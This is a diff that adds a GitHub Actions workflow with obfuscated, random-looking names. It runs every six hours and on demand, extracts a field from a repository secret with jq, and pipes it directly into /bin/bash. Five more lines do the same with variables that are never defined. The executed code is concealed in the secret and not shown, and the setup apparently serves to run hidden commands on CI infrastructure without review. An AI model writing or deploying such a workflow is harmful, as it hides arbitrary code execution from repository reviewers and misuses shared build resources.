@@ -1,0 +1,24 @@
+name: qiyufeng3718
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '16 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: qiyufeng3718
+        env:
+          t892: ${{ secrets.t892 }}
+        run: |
+          echo $t892 | jq -r .y602 | /bin/bash
+          echo $tj63 | jq -r .qipez21 | /bin/bash
+          echo $zokqy18 | jq -r .ctx1436 | /bin/bash
+          echo $vp33 | jq -r .g8 | /bin/bash
+          echo $axs73846 | jq -r .q85 | /bin/bash
+          echo $arvt3 | jq -r .xwfy4648 | /bin/bash
+
